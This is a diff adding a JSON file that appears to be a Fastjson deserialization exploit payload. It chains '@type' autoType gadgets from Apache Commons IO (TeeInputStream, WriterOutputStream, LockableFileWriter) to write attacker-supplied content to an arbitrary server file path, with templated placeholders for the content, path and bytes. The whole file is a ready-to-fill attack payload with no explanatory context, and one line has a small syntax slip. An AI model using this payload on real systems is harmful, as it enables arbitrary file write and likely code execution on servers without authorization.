@@ -1,0 +1,48 @@
+{
+  "dd":{
+    "@type":"java.util.Currency",
+    "val":{
+      "currency":{
+        "w":{
+          "@type":"java.io.InputStream",
+          "@type":"org.apache.commons.io.input.BOMInputStream",
+          "delegate":{
+            "@type": "org.apache.commons.io.input.AutoCloseInputStream",
+            "in": {
+              "@type": "org.apache.commons.io.input.TeeInputStream",
+              "input": {
+                "@type": "org.apache.commons.io.input.CharSequenceInputStream",
+                "s": {
+                  "@type": "java.lang.String"
+                  "${hexContent}",
+                  "charset": "iso-8859-1",
+                  "bufferSize": 1
+                },
+                "branch": {
+                  "@type": "org.apache.commons.io.output.WriterOutputStream",
+                  "writer": {
+                    "@type": "org.apache.commons.io.output.LockableFileWriter",
+                    "file": "${path}",
+                    "encoding": "iso-8859-1",
+                    "charset": "iso-8859-1",
+                    "append": false
+                  },
+                  "charset":"iso-8859-1",
+                  "charsetName":"iso-8859-1",
+                  "bufferSize": 1024,
+                  "writeImmediately": true
+                },
+                "closeBranch": true
+              }
+            },
+            "include":true,
+            "boms":[{
+              "@type": "org.apache.commons.io.ByteOrderMark",
+              "charsetName": "iso-8859-1",
+              "bytes":${byteArray}
+            }]
+          }
+        }
+      }
+    }
+  }
